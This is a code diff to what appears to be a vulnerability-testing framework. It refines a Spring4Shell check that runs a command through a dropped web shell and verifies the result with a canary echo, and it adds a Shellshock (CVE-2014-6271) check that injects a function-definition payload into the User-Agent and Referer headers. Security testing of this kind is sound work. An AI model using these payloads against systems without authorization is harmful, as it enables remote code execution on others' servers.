@@ -81,16 +81,17 @@ def run_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
     issues = []
     
     # Try to execute a command via the dropped shell
-    shell_url = f"{client.base_url}/{shell_filename}?cmd=whoami"
+    # Use a specific calculation or unique string to verify execution
+    canary = "bp_rce_verified"
+    shell_url = f"{client.base_url}/{shell_filename}?cmd=echo+{canary}"
     resp = client.send("GET", shell_url)
     
     # Check for success (RCE output)
-    if resp.status_code == 200 and ("root" in resp.text or "nt authority" in resp.text.lower() or len(resp.text) > 0):
+    # STRICT CHECK: Must see the canary string. 200 OK alone is NOT enough (might be a catch-all route).
+    if resp.status_code == 200 and canary in resp.text:
         issues.append(f"Spring4Shell SUCCESS: Web Shell dropped & executed at /{shell_filename}")
         issues.append(f"RCE Output: {resp.text[:100]}...")
-    elif resp.status_code >= 500:
-         issues.append("Spring4Shell: 500 Error during exploit (Potentially Blocked/Failed) - Check Server Logs")
-    
+        
     return {
         "scenario_id": scenario.id,
         "attack_type": "spring4shell",
@@ -120,5 +121,23 @@ def run_struts2_rce(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         "scenario_id": scenario.id,
         "attack_type": "struts2_rce",
         "passed": len(issues) == 0,
+        "details": {"issues": issues}
+    }
+
+def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """
+    Shellshock (CVE-2014-6271)
+    Injects malicious function definition in User-Agent.
+    """
+    payload = "() { :;}; echo; echo 'VULNERABLE_SHELLSHOCK'"
+    resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
+    issues = []
+    if "VULNERABLE_SHELLSHOCK" in resp.text:
+        issues.append("Shellshock (CVE-2014-6271) RCE Executed.")
+        
+    return {
+        "scenario_id": scenario.id,
+        "attack_type": "shellshock",
+        "passed": not issues,
         "details": {"issues": issues}
     }
